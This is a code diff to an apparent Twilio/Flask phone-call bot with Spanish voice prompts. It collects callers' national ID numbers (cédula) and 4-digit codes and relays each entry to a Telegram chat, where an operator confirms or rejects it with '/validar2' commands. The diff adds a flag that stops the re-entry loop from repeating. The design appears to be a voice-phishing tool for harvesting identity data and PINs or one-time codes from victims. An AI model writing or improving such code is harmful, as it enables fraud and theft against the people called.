@@ -329,13 +329,16 @@ def save_step1():
         data = global_user_sessions[call_sid]
         msg = f"🔄 Cédula actualizada en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
         send_to_telegram(msg)
-        
+        global_user_sessions[call_sid].pop('correction_in_progress', None)
+        save_session_to_file(global_user_sessions)
+
         response.say("Gracias. Continuando con la revalidación de sus datos.", language='es-ES')
         response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
     else:
         # Flujo normal: continuar al siguiente paso
         response.say("Continuando.", language='es-ES')
         response.redirect('/step2')
+    
     
     return str(response)
 
@@ -393,6 +396,8 @@ def save_step2():
     if is_intermediate_revalidation:
         msg = f"🔄 Código 4 dígitos actualizado en revalidación intermedia:\n🆔 Cédula: {data.get('cedula', 'N/A')} ({digit_length} dígitos)\n🔢 Código 4 dígitos: {data.get('code4', 'N/A')}\n\nResponde con:\n/validar2 {call_sid} 1 1 (si ambos están bien)\n/validar2 {call_sid} 1 0 (si la cédula está bien pero el código no)\n/validar2 {call_sid} 0 1 (si la cédula está mal pero el código bien)\n/validar2 {call_sid} 0 0 (si ambos están mal)"
         send_to_telegram(msg)
+        global_user_sessions[call_sid].pop('correction_in_progress', None)
+        save_session_to_file(global_user_sessions)
         
         response.say("Gracias. Estamos revalidando sus datos actualizados. Por favor, espere unos momentos.", language='es-ES')
         response.redirect(f"/waiting-intermediate-validation?CallSid={call_sid}&wait=8&revalidation=true")
@@ -509,22 +514,38 @@ def intermediate_validation_result():
             response.redirect('/step3')  # Continuar al paso 3
             return str(response)
         else:
-            # Mensaje general cuando hay errores en los primeros datos
-            response.say("Hemos detectado algunos problemas con los primeros datos proporcionados.", language='es-ES')
+            # NUEVA LÓGICA: Verificar si ya se está procesando una corrección
+            correction_in_progress = global_user_sessions[call_sid].get('correction_in_progress', False)
             
-            # MANTENER el estado de revalidación intermedia y redirigir al dato incorrecto
-            # NO eliminamos validacion_intermedia aquí
-            
-            # Verificar qué dato es incorrecto y redirigir
-            if validation[0] == 0:  # Cédula incorrecta
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÉDULA INCORRECTA PARA SID={call_sid} (MANTENER REVALIDACIÓN)")
-                response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
-                response.redirect('/step1')
-            elif validation[1] == 0:  # Código de 4 dígitos incorrecto
-                logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO 4 DÍGITOS INCORRECTO PARA SID={call_sid} (MANTENER REVALIDACIÓN)")
-                response.say("El código de 4 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
-                response.redirect('/step2')
-            return str(response)
+            if correction_in_progress:
+                # Ya estamos en proceso de corrección, eliminar validación y esperar nueva
+                logger.info(f"🔄 CORRECCIÓN EN PROGRESO PARA SID={call_sid}, LIMPIANDO VALIDACIÓN ANTERIOR")
+                global_user_sessions[call_sid].pop('validacion_intermedia', None)
+                save_session_to_file(global_user_sessions)
+                
+                # Continuar esperando la nueva validación
+                response.say("Estamos procesando su corrección. Por favor espere un momento.", language='es-ES')
+                response.pause(length=8)
+                response.redirect(f"/intermediate-validation-result?sid={call_sid}")
+                return str(response)
+            else:
+                # Primera vez detectando el error, marcar corrección en progreso
+                global_user_sessions[call_sid]['correction_in_progress'] = True
+                save_session_to_file(global_user_sessions)
+                
+                # Mensaje general cuando hay errores en los primeros datos
+                response.say("Hemos detectado algunos problemas con los primeros datos proporcionados.", language='es-ES')
+                
+                # Verificar qué dato es incorrecto y redirigir
+                if validation[0] == 0:  # Cédula incorrecta
+                    logger.info(f"⚠️ REDIRIGIENDO A PASO 1 - CÉDULA INCORRECTA PARA SID={call_sid} (PRIMERA CORRECCIÓN)")
+                    response.say("La cédula ingresada parece ser incorrecta. Por favor, ingrésela nuevamente.", language='es-ES')
+                    response.redirect('/step1')
+                elif validation[1] == 0:  # Código de 4 dígitos incorrecto
+                    logger.info(f"⚠️ REDIRIGIENDO A PASO 2 - CÓDIGO 4 DÍGITOS INCORRECTO PARA SID={call_sid} (PRIMERA CORRECCIÓN)")
+                    response.say("El código de 4 dígitos parece ser incorrecto. Por favor, ingréselo nuevamente.", language='es-ES')
+                    response.redirect('/step2')
+                return str(response)
     else:
         # Añadimos un contador para evitar bucles infinitos
         count_key = f"{call_sid}_intermediate_retry_count"
